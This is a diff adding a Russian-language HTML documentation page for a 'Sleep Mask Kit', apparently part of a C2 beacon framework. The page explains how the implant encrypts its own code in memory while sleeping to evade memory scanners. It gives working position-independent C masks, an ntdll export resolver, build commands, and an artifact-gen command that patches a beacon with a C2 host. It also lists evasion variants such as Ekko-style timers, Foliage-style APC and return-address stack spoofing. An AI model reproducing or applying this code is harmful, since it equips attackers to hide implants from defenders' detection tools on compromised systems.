@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Sleep Mask Kit</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Главная</a> &raquo; Sleep Mask Kit</nav>
+
+<h1>Sleep Mask Kit</h1>
+
+<p>Sleep Mask Kit позволяет заменить встроенную логику сна beacon'а на пользовательский
+PIC-шелкод. Во время сна beacon шифрует свои исполняемые секции, меняет их защиту на RW
+и выполняет задержку. Это делает beacon невидимым для сканеров памяти.</p>
+
+<ul class="toc">
+<li><a href="#arch">Архитектура</a></li>
+<li><a href="#api">API (SleepMaskCtx)</a></li>
+<li><a href="#contract">Контракт маски</a></li>
+<li><a href="#build">Сборка</a></li>
+<li><a href="#variants">Готовые варианты</a></li>
+<li><a href="#writing">Как написать свою маску</a></li>
+<li><a href="#x86-pitfalls">Подводные камни x86</a></li>
+<li><a href="#example-minimal">Пример: минимальная маска</a></li>
+<li><a href="#example-chacha">Пример: ChaCha20</a></li>
+<li><a href="#integration">Интеграция с beacon'ом</a></li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="arch">Архитектура</h2>
+
+<p>Beacon PE имеет специальные секции для обфускации сна:</p>
+
+<table>
+<tr><th>Секция</th><th>Содержимое</th><th>Шифруется во сне?</th></tr>
+<tr><td><code>.text</code></td><td>Код beacon'а (tasking, команды, крипто)</td><td>Да</td></tr>
+<tr><td><code>.rdata</code></td><td>Константы, таблицы импорта</td><td>Да</td></tr>
+<tr><td><code>.sleep</code></td><td>Трамплин (masked_sleep, разрешение NT-функций)</td><td>Нет</td></tr>
+<tr><td><code>.slpmsk</code></td><td>Слот для пользовательского шелкода (8192 байта)</td><td>Нет</td></tr>
+<tr><td><code>.co2cfg</code></td><td>BeaconState (конфигурация)</td><td>Нет</td></tr>
+</table>
+
+<h3>Поток выполнения</h3>
+<pre>
+beacon_run()
+  +-- masked_sleep(ms)                     [.sleep section]
+       |-- find_self_base()                VirtualQuery -> module base
+       |-- Walk PE sections -> regions[]   (only .text, .rdata)
+       |-- bc_random(key, 16)              generate XOR key
+       |-- Resolve NtProtectVirtualMemory, NtDelayExecution, etc.
+       |-- IF .slpmsk patched:
+       |       [4-byte EP offset] -> call user mask blob
+       |   ELSE:
+       |       call default_mask() (built-in XOR + NtDelayExecution)
+       +-- Zero key, return
+</pre>
+
+<h3>Формат блоба (.slpmsk)</h3>
+<p>Блоб — это извлечённая <code>.text</code> секция скомпилированной маски с 4-байтным заголовком:</p>
+<pre>
+[uint32_t LE: смещение от начала блоба до entry point]
+[... весь код .text секции ...]
+</pre>
+<p>Поскольку линкер использует <code>/MERGE:.rdata=.text</code>, все данные
+(строки, таблицы) сливаются в <code>.text</code> перед кодом. Entry point обычно
+не на нулевом смещении — заголовок указывает точное смещение.</p>
+
+<div class="note">
+Максимальный размер блоба: <b>8176 байт</b> (8192 - 16 байт сентинела).
+Если скомпилированная маска превышает этот размер, artifact-gen откажет в патчинге.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="api">API (SleepMaskCtx)</h2>
+
+<p>Трамплин заполняет структуру <code>SleepMaskCtx</code> и передаёт указатель
+на неё в маску. Определение в <code>kit/sleepmask/sleep_mask_api.h</code>:</p>
+
+<h3>SleepRegion</h3>
+<pre>
+typedef struct SleepRegion {
+    void*    base;           // виртуальный адрес региона
+    uint32_t size;           // размер в байтах
+    uint32_t original_prot;  // исходная защита PAGE_*
+} SleepRegion;
+</pre>
+
+<h3>SleepMaskCtx</h3>
+<pre>
+typedef struct SleepMaskCtx {
+    // ---- Регионы для шифрования ----
+    SleepRegion regions[16];   // .text, .rdata (заполнены трамплином)
+    uint32_t    region_count;  // количество заполненных элементов
+
+    // ---- Крипто-материал ----
+    uint8_t     key[16];       // случайный 16-байтный ключ (новый каждый цикл)
+
+    // ---- Параметры сна ----
+    uint32_t    sleep_ms;      // задержка в миллисекундах
+    uint8_t     jitter_pct;    // процент дрожания (0-99)
+    uint8_t     _pad[3];
+
+    // ---- Указатели на NT-функции (из ntdll.dll) ----
+    NTSTATUS (*NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+    NTSTATUS (*NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
+    NTSTATUS (*NtWaitForSingleObject)(HANDLE, BOOL, PLARGE_INTEGER);
+
+    // ---- Kernel32 ----
+    BOOL (*FlushInstructionCache)(HANDLE hProcess, const void*, SIZE_T);
+
+    // ---- Вспомогательное ----
+    HANDLE  process_handle;    // псевдо-хендл (HANDLE)-1
+    void*   ntdll_base;        // база ntdll.dll (для резолва доп. функций)
+} SleepMaskCtx;
+</pre>
+
+<h3>Описание полей</h3>
+<table>
+<tr><th>Поле</th><th>Тип</th><th>Описание</th></tr>
+<tr><td><code>regions[]</code></td><td>SleepRegion[16]</td>
+    <td>Массив регионов памяти для шифрования. Заполняется трамплином из PE section table.
+    Содержит только <code>.text</code> и <code>.rdata</code> (если не слиты).</td></tr>
+<tr><td><code>region_count</code></td><td>uint32_t</td>
+    <td>Количество валидных элементов в <code>regions[]</code>.</td></tr>
+<tr><td><code>key[16]</code></td><td>uint8_t[16]</td>
+    <td>Случайный ключ, сгенерированный <code>bc_random()</code>. Можно использовать как
+    seed для собственного алгоритма шифрования (ChaCha20, AES и т.д.).</td></tr>
+<tr><td><code>sleep_ms</code></td><td>uint32_t</td>
+    <td>Время сна в миллисекундах (из <code>BeaconState.sleep_ms</code>).</td></tr>
+<tr><td><code>jitter_pct</code></td><td>uint8_t</td>
+    <td>Процент дрожания (0 = точный таймер, 50 = +-50% от sleep_ms).</td></tr>
+<tr><td><code>NtProtectVirtualMemory</code></td><td>function ptr</td>
+    <td>Изменение защиты памяти. Используется для RW перед шифрованием и восстановления после.</td></tr>
+<tr><td><code>NtDelayExecution</code></td><td>function ptr</td>
+    <td>Простая задержка (аналог Sleep). Отрицательное значение = относительное время.</td></tr>
+<tr><td><code>NtWaitForSingleObject</code></td><td>function ptr</td>
+    <td>Ожидание объекта. Предпочтительнее NtDelayExecution (чище стек при сканировании).</td></tr>
+<tr><td><code>FlushInstructionCache</code></td><td>function ptr</td>
+    <td>Сброс кеша инструкций после расшифровки (обязательно на ARM, желательно на x86/x64).</td></tr>
+<tr><td><code>process_handle</code></td><td>HANDLE</td>
+    <td>Псевдо-хендл текущего процесса (<code>(HANDLE)-1</code>). Передавать в NtProtectVirtualMemory.</td></tr>
+<tr><td><code>ntdll_base</code></td><td>void*</td>
+    <td>Базовый адрес ntdll.dll. Можно использовать для резолва дополнительных функций
+    (NtCreateEvent, NtQueueApcThread и др.) через парсинг export directory.</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="contract">Контракт маски</h2>
+
+<p>Пользовательский код <b>обязан</b> выполнить следующую последовательность:</p>
+
+<ol>
+<li><b>Изменить защиту на RW</b> — <code>NtProtectVirtualMemory(..., PAGE_READWRITE, ...)</code>
+    для каждого региона. Убирает Execute — сканер не увидит исполняемого beacon-кода.</li>
+<li><b>Зашифровать регионы</b> — XOR, ChaCha20, AES или любой симметричный алгоритм.
+    Ключ: <code>ctx-&gt;key[16]</code> (или производный от него).</li>
+<li><b>Выполнить задержку</b> — <code>NtDelayExecution</code>, <code>NtWaitForSingleObject</code>,
+    timer-queue APC или иной механизм ожидания.</li>
+<li><b>Расшифровать регионы</b> — та же операция в обратном порядке.</li>
+<li><b>Восстановить защиту</b> — вернуть <code>original_prot</code> для каждого региона.</li>
+<li><b>FlushInstructionCache</b> — сбросить кеш инструкций.</li>
+</ol>
+
+<div class="warning">
+<b>ЗАПРЕЩЕНО</b> вызывать любые функции beacon'а — его <code>.text</code> секция
+зашифрована во время выполнения маски! Все необходимые функции должны быть
+резолвнуты через <code>ctx-&gt;ntdll_base</code> или получены из <code>ctx</code>.
+</div>
+
+<h3>Правила PIC-кода</h3>
+<ul>
+<li>Никаких глобальных переменных и статических данных.</li>
+<li>Никаких строковых литералов (<code>"NtCreateEvent"</code>) — только массивы на стеке.</li>
+<li>Никакого CRT (malloc, printf, memcpy и т.д.).</li>
+<li>Entry point <code>sleep_mask_entry</code> должна быть <b>первой определённой функцией</b> в файле.</li>
+<li>Все вспомогательные функции определяются <b>после</b> entry point.</li>
+<li>Соглашение вызова: <code>__cdecl</code>.</li>
+<li>Максимальный размер скомпилированного кода: 8176 байт.</li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="build">Сборка</h2>
+
+<h3>Автоматическая (build_all.bat)</h3>
+<pre>
+cd kit\sleepmask
+build_all.bat
+</pre>
+<p>Скрипт компилирует все маски из <code>masks\</code> + <code>default_mask.c</code>
+для x64 и x86. Результат: <code>bin\&lt;name&gt;.x64.bin</code> и <code>bin\&lt;name&gt;.x86.bin</code>.</p>
+
+<h3>Ручная сборка одной маски</h3>
+<pre>
+REM x64:
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\sleepmask" ^
+    /Fo"mask.obj" my_mask.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:mask.exe mask.obj
+python kit\sleepmask\extract_section.py mask.exe .text mask.x64.bin
+
+REM x86 (добавить /arch:IA32 и линковать x86_helpers.obj):
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\sleepmask" ^
+    /Fo"mask.obj" my_mask.c
+cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
+    kit\sleepmask\x86_helpers.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:mask.exe mask.obj helpers.obj
+python kit\sleepmask\extract_section.py mask.exe .text mask.x86.bin
+</pre>
+
+<h3>Применение маски к beacon'у</h3>
+<pre>
+artifact-gen --input beacon64.exe --mask bin\chacha_sleep.x64.bin ^
+    --host 10.0.0.5 --port 443 --key ... --out patched.exe
+</pre>
+
+<h3>Флаги компиляции</h3>
+<table>
+<tr><th>Флаг</th><th>Назначение</th></tr>
+<tr><td><code>/O2</code></td><td>Оптимизация по скорости (минимизирует объём кода)</td></tr>
+<tr><td><code>/GS-</code></td><td>Отключить stack cookies (нет CRT-инициализации)</td></tr>
+<tr><td><code>/Zl</code></td><td>Не ссылаться на default-библиотеки</td></tr>
+<tr><td><code>/TC</code></td><td>Компилировать как C (не C++)</td></tr>
+<tr><td><code>/arch:IA32</code></td><td><b>Только x86!</b> Запрещает SSE — см. <a href="#x86-pitfalls">подводные камни x86</a></td></tr>
+<tr><td><code>/MERGE:.rdata=.text</code></td><td>Слить .rdata в .text (единый блоб)</td></tr>
+<tr><td><code>/ENTRY:sleep_mask_entry</code></td><td>Точка входа PE = entry point маски</td></tr>
+<tr><td><code>/NODEFAULTLIB</code></td><td>Без CRT</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="variants">Готовые варианты</h2>
+
+<table>
+<tr><th>Маска</th><th>Каталог</th><th>Шифрование</th><th>Метод сна</th><th>Особенности</th></tr>
+<tr><td><b>default</b></td>
+    <td><code>default_mask.c</code></td>
+    <td>XOR-16</td>
+    <td>NtDelayExecution</td>
+    <td>Базовый вариант, минимальный размер кода</td></tr>
+<tr><td><b>ekko_timer</b></td>
+    <td><code>masks/ekko_timer/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>Стек показывает ntdll, а не beacon</td></tr>
+<tr><td><b>chacha_sleep</b></td>
+    <td><code>masks/chacha_sleep/</code></td>
+    <td>ChaCha20 (256-bit key)</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>Без паттерна в зашифрованной памяти (период ключа > размера секции)</td></tr>
+<tr><td><b>foliage_apc</b></td>
+    <td><code>masks/foliage_apc/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>Стиль Foliage: стек чист, нет исполняемых страниц</td></tr>
+<tr><td><b>stack_spoof</b></td>
+    <td><code>masks/stack_spoof/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject</td>
+    <td>Подделка return-адреса на стеке (RET-гаджет в ntdll)</td></tr>
+</table>
+
+<div class="opsec">
+<b>ekko_timer</b> и <b>foliage_apc</b> — стек потока при сканировании не содержит адресов beacon'а.
+<b>chacha_sleep</b> — зашифрованная память статистически неотличима от случайных данных.
+<b>stack_spoof</b> — все фреймы на стеке указывают в подписанные модули (ntdll).
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="writing">Как написать свою маску</h2>
+
+<h3>Шаблон</h3>
+<pre>
+#include "sleep_mask_api.h"
+
+// Вспомогательные функции (forward declaration).
+static int   pic_strcmp(const char* a, const char* b);
+static void* pic_get_proc(void* module_base, const char* func_name);
+
+// ---- ENTRY POINT (должна быть ПЕРВОЙ функцией в файле) ----
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    uint32_t i;
+    SIZE_T sz;
+    PVOID base;
+    ULONG old_prot;
+
+    // 1. Защита -> RW
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz, 0x04, &amp;old_prot);
+    }
+
+    // 2. Шифрование
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 3. Задержка
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
+        ctx->NtDelayExecution(FALSE, &amp;delay);
+    }
+
+    // 4. Расшифровка (XOR симметричен)
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 5. Восстановление защиты
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz,
+            (ULONG)ctx->regions[i].original_prot, &amp;old_prot);
+    }
+
+    // 6. Flush
+    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
+}
+
+// ---- Вспомогательные функции (ПОСЛЕ entry point) ----
+// ...
+</pre>
+
+<h3>Резолв дополнительных NT-функций</h3>
+<p>Если нужны функции, не включённые в <code>SleepMaskCtx</code> (например,
+<code>NtCreateEvent</code>, <code>NtClose</code>), их можно получить через
+парсинг export directory ntdll по адресу <code>ctx-&gt;ntdll_base</code>:</p>
+
+<pre>
+// Строки на стеке (PIC!) -- НЕ литералы!
+char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+
+// Резолв через pic_get_proc (парсинг PE export table)
+typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
+pfn_NtCreateEvent NtCreateEvent =
+    (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
+</pre>
+
+<h3>Реализация pic_get_proc</h3>
+<p>Стандартная реализация, используемая во всех масках кита:</p>
+<pre>
+static int pic_strcmp(const char* a, const char* b) {
+    while (*a &amp;&amp; *a == *b) { a++; b++; }
+    return (unsigned char)*a - (unsigned char)*b;
+}
+
+static void* pic_get_proc(void* module_base, const char* func_name) {
+    unsigned char* base = (unsigned char*)module_base;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    IMAGE_DATA_DIRECTORY* exp_dir =
+        &amp;nt->OptionalHeader.DataDirectory[0]; // IMAGE_DIRECTORY_ENTRY_EXPORT
+    if (!exp_dir->VirtualAddress) return 0;
+    IMAGE_EXPORT_DIRECTORY* exp =
+        (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
+    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
+    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
+    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
+    for (DWORD i = 0; i &lt; exp->NumberOfNames; ++i) {
+        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
+            return (void*)(base + funcs[ordinals[i]]);
+    }
+    return 0;
+}
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="x86-pitfalls">Подводные камни x86</h2>
+
+<p>На x64 код изначально позиционно-независим (RIP-relative addressing).
+На x86 MSVC генерирует абсолютные адреса, что ломает PIC-шелкод.
+Три основные проблемы:</p>
+
+<h3>1. Строковые литералы</h3>
+<div class="warning">
+На x86 строка <code>"NtCreateEvent"</code> помещается в <code>.rdata</code>,
+а ссылка на неё — <code>push 0x004010xx</code> (абсолютный адрес). При загрузке шелкода по другому
+адресу этот указатель невалиден.
+</div>
+<p><b>Решение:</b> все строки объявлять как массивы символов на стеке:</p>
+<pre>
+// НЕПРАВИЛЬНО (x86 сломается):
+void* p = pic_get_proc(base, "NtCreateEvent");
+
+// ПРАВИЛЬНО (PIC на любой архитектуре):
+char s[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+void* p = pic_get_proc(base, s);
+</pre>
+
+<h3>2. SSE-инструкции с абсолютными адресами</h3>
+<div class="warning">
+MSVC по умолчанию использует SSE2 для инициализации массивов на стеке:
+<code>movaps xmm0, [0x00401000]</code> — загрузка 16-байтного шаблона из .rdata
+по абсолютному адресу.
+</div>
+<p><b>Решение:</b> компилировать x86-маски с флагом <code>/arch:IA32</code>, который
+полностью запрещает SSE-инструкции. Все операции выполняются через x87/ALU.</p>
+
+<h3>3. 64-битное умножение (__allmul)</h3>
+<div class="warning">
+Выражение <code>-(LONGLONG)sleep_ms * 10000LL</code> на x86 генерирует вызов
+<code>__allmul</code> — внутренней функции CRT для 64-битного умножения.
+Эта функция должна быть доступна в момент вызова.
+</div>
+<p><b>Для PIC-блобов:</b> при линковке подключается <code>x86_helpers.obj</code>
+(содержит <code>__allmul</code>, <code>__allshr</code>, <code>__aullshr</code>).
+Код попадает в <code>.text</code> блоба и работает корректно.</p>
+<p><b>Для встроенной маски beacon'а:</b> <code>__allmul</code> находится в <code>.text</code>
+секции beacon'а. Если маска зашифровала <code>.text</code> до вычисления задержки —
+вызов <code>__allmul</code> приведёт к краху. Поэтому все 64-битные операции
+<b>выполняются ДО шифрования</b>.</p>
+
+<pre>
+// ПРАВИЛЬНО: вычислить delay ДО шифрования
+LARGE_INTEGER delay;
+delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;  // вызывает __allmul
+
+// ... затем шифруем ...
+xor_encrypt(regions);
+
+// ... спим с уже вычисленным значением ...
+ctx->NtDelayExecution(FALSE, &amp;delay);
+</pre>
+
+<h3>Чек-лист для x86</h3>
+<table>
+<tr><th>Проверка</th><th>Что искать</th></tr>
+<tr><td>Строки</td><td>Все строки — массивы <code>char s[] = {'.','.','.',0};</code></td></tr>
+<tr><td>SSE</td><td>Флаг <code>/arch:IA32</code> в cl.exe</td></tr>
+<tr><td>__allmul</td><td>Все <code>int64</code> операции ДО шифрования .text
+    (или внутри PIC-блоба, где __allmul линкуется вместе с кодом)</td></tr>
+<tr><td>helpers.obj</td><td>x86-сборка линкуется с <code>x86_helpers.obj</code></td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="example-minimal">Пример: минимальная маска</h2>
+
+<p>Файл <code>default_mask.c</code> — простейшая рабочая маска (XOR-16 + NtDelayExecution):</p>
+<pre>
+#include "sleep_mask_api.h"
+
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    uint32_t i;
+    SIZE_T sz;
+    PVOID base;
+    ULONG old_prot;
+
+    // 1. RW
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz, 0x04, &amp;old_prot);
+    }
+
+    // 2. XOR encrypt
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 3. Sleep
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
+        ctx->NtDelayExecution(FALSE, &amp;delay);
+    }
+
+    // 4. XOR decrypt
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 5. Restore
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz,
+            (ULONG)ctx->regions[i].original_prot, &amp;old_prot);
+    }
+
+    // 6. Flush
+    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
+}
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="example-chacha">Пример: ChaCha20 + NtWaitForSingleObject</h2>
+
+<p>Файл <code>masks/chacha_sleep/mask.c</code> демонстрирует:</p>
+<ul>
+<li>Использование полноценного потокового шифра (256-bit key из 16-байтного seed)</li>
+<li>Резолв дополнительных функций из ntdll через <code>pic_get_proc</code></li>
+<li>Ожидание через unsignaled event (чистый стек при сканировании)</li>
+<li>Зануление крипто-материала после использования</li>
+</ul>
+
+<pre>
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    // Key derivation: 16 -> 32 bytes key + 12 bytes nonce
+    uint8_t key32[32];
+    uint8_t nonce12[12];
+    for (int k = 0; k &lt; 16; ++k) {
+        key32[k] = ctx->key[k];
+        key32[16+k] = ctx->key[k] ^ 0xA5;
+    }
+    for (int k = 0; k &lt; 12; ++k) nonce12[k] = ctx->key[k + 4];
+
+    // Строки на стеке (PIC!)
+    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+    char s_nc[]  = {'N','t','C','l','o','s','e',0};
+
+    // Резолв доп. функций из ntdll
+    pfn_NtCreateEvent NtCreateEvent =
+        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
+    pfn_NtClose NtClose =
+        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);
+
+    // Создание unsignaled event
+    HANDLE hEvent = 0;
+    int use_event = 0;
+    if (NtCreateEvent &amp;&amp; NtClose) {
+        if (NtCreateEvent(&amp;hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
+            use_event = 1;
+    }
+
+    // 1. RW
+    // 2. ChaCha20 encrypt
+    // 3. NtWaitForSingleObject (timeout = sleep_ms)
+    // 4. ChaCha20 decrypt (same key + counter=0)
+    // 5. Restore protection
+    // 6. FlushInstructionCache + NtClose(hEvent)
+
+    // Zero crypto material
+    for (int k = 0; k &lt; 32; ++k) key32[k] = 0;
+    for (int k = 0; k &lt; 12; ++k) nonce12[k] = 0;
+}
+</pre>
+
+<div class="note">
+Полный исходный код ChaCha20 (встроенный в шелкод) см. в
+<code>kit/sleepmask/masks/chacha_sleep/mask.c</code>.
+Реализация самодостаточна — не зависит от внешних библиотек.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="integration">Интеграция с beacon'ом</h2>
+
+<h3>Как beacon вызывает маску</h3>
+<ol>
+<li>Функция <code>masked_sleep(ms)</code> в секции <code>.sleep</code> вызывается
+    из главного цикла beacon'а.</li>
+<li>Трамплин определяет базу модуля через <code>VirtualQuery</code>.</li>
+<li>Обходит PE section table, отбирая <code>.text</code> и <code>.rdata</code>
+    (пропускает <code>.sleep</code>, <code>.slpmsk</code>, <code>.co2cfg</code>).</li>
+<li>Генерирует случайный 16-байтный ключ (<code>bc_random</code>).</li>
+<li>Резолвит NT-функции из ntdll (строки на стеке, без .rdata-паттернов).</li>
+<li>Проверяет секцию <code>.slpmsk</code>:
+    <ul>
+    <li>Если содержит сентинел <code>CO2H_SLPMASK_v1</code> — маска не вшита,
+        вызывает встроенную <code>default_mask()</code>.</li>
+    <li>Если сентинел перезаписан — читает 4-байтное смещение до EP,
+        прыгает на <code>g_slpmsk_slot + offset</code>.</li>
+    </ul></li>
+<li>После возврата маски — зануляет ключ, возвращает управление beacon'у.</li>
+</ol>
+
+<h3>Сентинел-детектирование</h3>
+<p>Проверка сентинела выполняется побайтово (без обращения к .rdata), чтобы
+исключить ложный паттерн при <code>/MERGE:.rdata=.text</code>:</p>
+<pre>
+if (g_slpmsk_slot[0]  != 'C')  return 1; // patched
+if (g_slpmsk_slot[1]  != 'O')  return 1;
+...
+if (g_slpmsk_slot[15] != '\0') return 1;
+return 0;  // unpatched
+</pre>
+
+<h3>Диаграмма секций в памяти</h3>
+<pre>
++------------------+
+| .text            |  <-- шифруется маской
+| .rdata           |  <-- шифруется маской
++------------------+
+| .sleep           |  <-- НЕ шифруется (трамплин + default_mask)
++------------------+
+| .slpmsk          |  <-- НЕ шифруется (пользовательский PIC-блоб)
++------------------+
+| .co2cfg          |  <-- НЕ шифруется (BeaconState)
++------------------+
+| .data, .bss      |  <-- НЕ шифруются (глобальные переменные)
++------------------+
+</pre>
+
+<h3>Структура каталога kit/sleepmask/</h3>
+<pre>
+kit/sleepmask/
+  sleep_mask_api.h       API-заголовок (включать в маску)
+  default_mask.c         Эталонная маска (XOR + NtDelayExecution)
+  x86_helpers.c          __allmul, __allshr для x86 (no-CRT)
+  extract_section.py     Скрипт извлечения .text из PE
+  build_all.bat          Сборка всех вариантов (x64 + x86)
+  masks/
+    ekko_timer/mask.c    Ekko-стиль (NtWaitForSingleObject)
+    chacha_sleep/mask.c  ChaCha20 (256-bit + event wait)
+    foliage_apc/mask.c   Foliage-стиль (NtWaitForSingleObject)
+    stack_spoof/mask.c   Подделка return-адресов на стеке
+  bin/                   Результат сборки (.bin файлы)
+</pre>
+
+</body></html>
